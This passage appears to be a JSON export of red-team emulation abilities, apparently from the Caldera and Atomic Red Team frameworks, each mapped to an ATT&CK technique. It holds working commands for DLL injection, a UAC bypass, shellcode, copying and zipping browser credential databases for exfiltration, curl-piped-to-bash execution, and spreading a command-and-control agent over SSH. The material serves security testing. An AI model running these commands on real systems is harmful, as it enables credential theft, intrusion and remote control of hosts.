explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Process Injection: Portable Executable Injection", "ability_id": "e5bcefee-262d-4568-a261-e8a20855ec81", "technique_id": "T1055.002", "tactic": "defense-evasion", "requirements": [], "name": "Signed Binary Execution - Mavinject", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Leverage odbcconf for DLL injection", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Process Injection: Dynamic-link Library Injection", "ability_id": "a74bc239-a196-4f7e-8d5c-fe8c0266071c", "technique_id": "T1055.001", "tactic": "defense-evasion", "requirements": [], "name": "Signed Binary Execution - odbcconf", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test attempts to open a file a specified number of times in Wordpad, then prints the contents. \nIt is designed to mimic BlackByte ransomware's print bombing technique, where tree.dll, which contains the ransom note, is opened in Wordpad 75 times and then printed. \nSee https://redcanary.com/blog/blackbyte-ransomware/. \n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["stop-process -name wordpad -force -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmd /c \"for /l %x in (1,1,75) do start wordpad.exe /p $env:temp\\T1059_003note.txt\" | out-null", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Windows Command Shell", "ability_id": "fa459e560b4daa3d644aae76de41653c", "technique_id": "T1059.003", "tactic": "execution", "requirements": [], "name": "Simulate BlackByte Ransomware Print Bombing", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test locates the Login Data files used by Chrome to store encrypted credentials, then copies them to the temp directory for later exfil. \nOnce the files are exfiltrated, malware like CookieMiner could be used to perform credential extraction. \nSee https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/ . \n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm \"/tmp/T1555.003_Login Data\" >/dev/null 2>&1; rm \"/tmp/T1555.003_Login Data For Account\" >/dev/null 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data\" \"/tmp/T1555.003_Login Data\"; cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data For Account\" \"/tmp/T1555.003_Login Data For Account\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "ability_id": "fd4249a81164c9014b395cf211fdeed2", "technique_id": "T1555.003", "tactic": "credential-access", "requirements": [], "name": "Simulating Access to Chrome Login Data - MacOS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test emulates MAZE ransomware's ability to enumerate directories using Powershell. \nUpon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window. \nSee https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["remove-item $env:temp\\T1083Test5.txt -ErrorAction SilentlyContinue"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$folderarray = @(\"Desktop\", \"Downloads\", \"Documents\", \"AppData/Local\", \"AppData/Roaming\"); Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append $env:temp\\T1083Test5.txt; Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append $env:temp\\T1083Test5.txt; Get-ChildItem -Path \"${env:ProgramFiles(x86)}\" -erroraction silentlycontinue | Out-File -append $env:temp\\T1083Test5.txt; $UsersFolder = \"$env:homedrive\\Users\\\"; foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) ; {; foreach ($secondarydirectory in $folderarray);  {Get-ChildItem -Path \"$UsersFolder/$directory/$secondarydirectory\" -ErrorAction SilentlyContinue | Out-File -append $env:temp\\T1083Test5.txt}; }; cat $env:temp\\T1083Test5.txt", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "File and Directory Discovery", "ability_id": "1033c974479429c54dff4470e614113d", "technique_id": "T1083", "tactic": "discovery", "requirements": [], "name": "Simulating MAZE Directory Enumeration", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Simulates an adversary accessing encrypted credentials from Google Chrome Login database. \n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path \"$env:temp\\Login Data\" -Force -ErrorAction Ignore; Remove-Item -Path \"$env:temp\\Login Data For Account\" -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination $env:temp; Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -Destination $env:temp", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "ability_id": "3267861a1da6d870da272e15b9ab088b", "technique_id": "T1555.003", "tactic": "credential-access", "requirements": [], "name": "Simulating access to Chrome Login Data", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Simulates an adversary accessing encrypted credentials from Opera web browser's login database. \n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path \"$env:temp\\Login Data\" -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Copy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -Destination $env:temp", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "ability_id": "32df42a1c7b596e73b7e4eee24438994", "technique_id": "T1555.003", "tactic": "credential-access", "requirements": [], "name": "Simulating access to Opera Login Data", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Simulates an adversary accessing encrypted credentials from Edge web browser's login database.\nmore info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path \"$env:temp\\Edge\" -Force -ErrorAction Ignore -Recurse"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\" -Destination $env:temp\\Edge -Force -Recurse", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "ability_id": "b8c5d884f259766b9fa1e6f32666ca0f", "technique_id": "T1555.003", "tactic": "credential-access", "requirements": [], "name": "Simulating access to Windows Edge Login Data", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Simulates an adversary accessing encrypted credentials from firefox web browser's login database.\nmore info in https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path \"$env:temp\\Profiles\" -Force -ErrorAction Ignore -Recurse"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" -Destination $env:temp -Force -Recurse", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "ability_id": "1a9d81f05549fb5061467e303cd8f386", "technique_id": "T1555.003", "tactic": "credential-access", "requirements": [], "name": "Simulating access to Windows Firefox Login Data", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "executes the slui exe file handler hijack", "repeatable": false, "privilege": "", "buckets": ["privilege-escalation"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["Akagi64.exe"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": ".\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "ability_id": "b7344901-0b02-4ead-baf6-e3f629ed545f", "technique_id": "T1548.002", "tactic": "privilege-escalation", "requirements": [], "name": "Slui File Handler Hijack", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Capture the local network broadcast IP address", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "ifconfig | grep broadcast", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "b6f545ef-f802-4537-b59d-2cb19831c8ed", "technique_id": "T1016", "tactic": "discovery", "requirements": [], "name": "Snag broadcast IP", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Perform a packet capture", "repeatable": false, "privilege": "Elevated", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["Remove-NetEventSession -Name \"PCAP\";\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.etl;"], "code": null, "timeout": 80, "build_target": null, "platform": "windows", "command": "$path = \"$ENV:UserProfile\\Desktop\\pcap.etl\";\nNew-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $path;\nAdd-NetEventProvider -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\";\nStart-NetEventSession -Name \"PCAP\";\nStart-Sleep -s 60;\nStop-NetEventSession -Name \"PCAP\";\nif (Test-Path $path) {\n  echo $path;\n  exit 0;\n} else {\n  echo \"Failed to generate PCAP file.\";\n  exit 1;\n};", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "tcpdump -i en0 & sleep 5; kill $!", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Network Sniffing", "ability_id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7", "technique_id": "T1040", "tactic": "credential-access", "requirements": [], "name": "Sniff network traffic", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Space after filename.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -rf /tmp/atomic-test-T1036.006"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "mkdir -p /tmp/atomic-test-T1036.006; cd /tmp/atomic-test-T1036.006; mkdir -p 'testdirwithspaceend '; /usr/bin/echo -e \"%d\\na\\n#!/usr/bin/perl\\nprint \\\"running T1035.006 with space after filename to masquerade init\\\\n\\\";\\nqx/cp \\/usr\\/bin\\/perl 'init  '/;\\nqx/'.\\/init  ' -e 'sleep 5'/;\\n.\\nwq\\n\" | ed 'testdirwithspaceend /init ' >/dev/null; chmod +x 'testdirwithspaceend /init '; './testdirwithspaceend /init '", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -rf /tmp/atomic-test-T1036.006"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "mkdir -p /tmp/atomic-test-T1036.006; cd /tmp/atomic-test-T1036.006; mkdir -p 'testdirwithspaceend '; /usr/bin/echo -e \"%d\\na\\n#!/usr/bin/perl\\nprint \\\"running T1035.006 with space after filename to masquerade init\\\\n\\\";\\nqx/cp \\/usr\\/bin\\/perl 'init  '/;\\nqx/'.\\/init  ' -e 'sleep 5'/;\\n.\\nwq\\n\" | ed 'testdirwithspaceend /init ' >/dev/null; chmod +x 'testdirwithspaceend /init '; './testdirwithspaceend /init '", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Masquerading: Space after Filename", "ability_id": "1d3d67824a72ebdf9811b3bbcec481a0", "technique_id": "T1036.006", "tactic": "defense-evasion", "requirements": [], "name": "Space After Filename", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Start a new calculator process", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3", "language": null, "name": "shellcode_amd64", "variations": [], "uploads": []}], "technique_name": "Process Injection", "ability_id": "a42dfc86-12f0-4f06-b0cf-24830c7f61f4", "technique_id": "T1055", "tactic": "defense-evasion", "requirements": [], "name": "Spawn calculator (shellcode)", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,\nsimulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). \n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path \"$env:temp\\T1555.003.zip\" -force -erroraction silentlycontinue   ; Remove-Item -Path \"$env:temp\\T1555.003\\\" -force -recurse -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$exfil_folder = \"$env:temp\\T1555.003\"; if (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}; $FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"; if (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}; if (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}; if (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}; if (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}; if (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}; if (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} ; compress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "ability_id": "56c2f2d8b48bcb1c999d4e8929bd8d9b", "technique_id": "T1555.003", "tactic": "credential-access", "requirements": [], "name": "Stage Popular Credential Files for Exfiltration", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Force $env:TEMP\\discovery.bat -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile $env:TEMP\\discovery.bat", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Data Staged: Local Data Staging", "ability_id": "4382d53f0f53399e72c728d019fffd77", "technique_id": "T1074.001", "tactic": "collection", "requirements": [], "name": "Stage data from Discovery.bat", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize curl to download discovery.sh and execute a basic information gathering shell script\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | bash -s > /tmp/T1074.001_discovery.log", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | bash -s > /tmp/T1074.001_discovery.log", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Data Staged: Local Data Staging", "ability_id": "f16438a836c9c466cc3d56cb0262fe3f", "technique_id": "T1074.001", "tactic": "collection", "requirements": [], "name": "Stage data from Discovery.sh", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "copy files to staging directory", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "sensitive.files"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Data Staged: Local Data Staging", "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e", "technique_id": "T1074.001", "tactic": "collection", "requirements": [{"relationship_match": [{"source": "host.file.path"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}, {"relationship_match": [{"source": "host.dir.staged"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Stage sensitive files", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "copy files to staging directory", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "sensitive.files"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Data Staged: Local Data Staging", "ability_id": "a394a5f9-8cd4-4a1b-b6b8-893b214c70cb", "technique_id": "T1074.001", "tactic": "collection", "requirements": [{"relationship_match": [{"source": "host.dir.staged"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Stage sensitve files", "plugin": ""}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "copy files to staging directory", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "sensitive.files"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Data Staged: Local Data Staging", "ability_id": "4f99a38f-4e59-45f3-a63e-15ba45a6fec7", "technique_id": "T1074.001", "tactic": "collection", "requirements": [{"relationship_match": [{"source": "host.dir.staged"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Stage senstive files", "plugin": ""}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Export all user certificates and add to a compressed archive.\n", "repeatable": false, "privilege": "", "buckets": ["redcanary-unknown"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$exfilpath=\"$env:PUBLIC\\T1649\\certs\"; Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$archive=\"$env:PUBLIC\\T1649\\atomic_certs.zip\"; $exfilpath=\"$env:PUBLIC\\T1649\\certs\"; Add-Type -assembly \"system.io.compression.filesystem\"; Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore; mkdir $exfilpath | Out-Null; foreach ($cert in (gci Cert:\\CurrentUser\\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\\$($cert.FriendlyName).cer}; [io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Steal or Forge Authentication Certificates", "ability_id": "b41910e3770cff37dd642650f0d91672", "technique_id": "T1649", "tactic": "redcanary-unknown", "requirements": [], "name": "Staging Local Certificates via Export-Certificate", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": true, "description": "Start a new 54ndc47 agent in background", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["sandcat.go"], "parsers": [], "cleanup": ["pkill -f sandcat"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "nohup ./sandcat.go -server #{server} &", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["sandcat.go"], "parsers": [], "cleanup": ["pkill -f sandcat"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "nohup ./sandcat.go -server #{server} &", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Unix Shell", "ability_id": "b1d41972-3ad9-4aa1-8f7f-05f049a2980e", "technique_id": "T1059.004", "tactic": "execution", "requirements": [], "name": "Start 54ndc47", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": true, "description": "Copy 54ndc47 to remote host and start it, assumes target uses SSH keys and passwordless authentication", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["sandcat.go-darwin"], "parsers": [], "cleanup": ["ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["sandcat.go-linux"], "parsers": [], "cleanup": ["ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Remote Services: SSH", "ability_id": "10a9d979-e342-418a-a9b0-002c483e0fa6", "technique_id": 